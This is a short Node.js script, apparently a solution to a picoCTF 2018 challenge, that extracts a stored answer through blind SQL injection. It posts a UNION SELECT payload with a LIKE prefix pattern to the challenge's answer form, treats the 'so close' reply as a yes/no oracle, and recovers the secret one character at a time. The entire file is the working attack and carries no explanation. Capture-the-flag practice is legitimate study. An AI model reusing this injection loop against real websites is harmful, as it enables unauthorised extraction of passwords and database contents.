const request = require('request');

const chars = 'qwertyuiopasdfghjklzxcvbnm1234567890'.split('');
const pass = [];

const bf = i => {
  request.post(
    {
      url: 'http://2018shell.picoctf.com:15987/answer2.php',
      form: {
        answer: `'UNION SELECT * FROM answers WHERE answer LIKE '${pass.join('')}${i}%`
      }
    },
    (err, res, body) => {
      if (body.includes('so close')) {
        pass.push(i);
        console.log(pass.join(''));
        chars.forEach(c => bf(c));
      } 
      return;  
    }
  );
};

chars.forEach(c => bf(c));


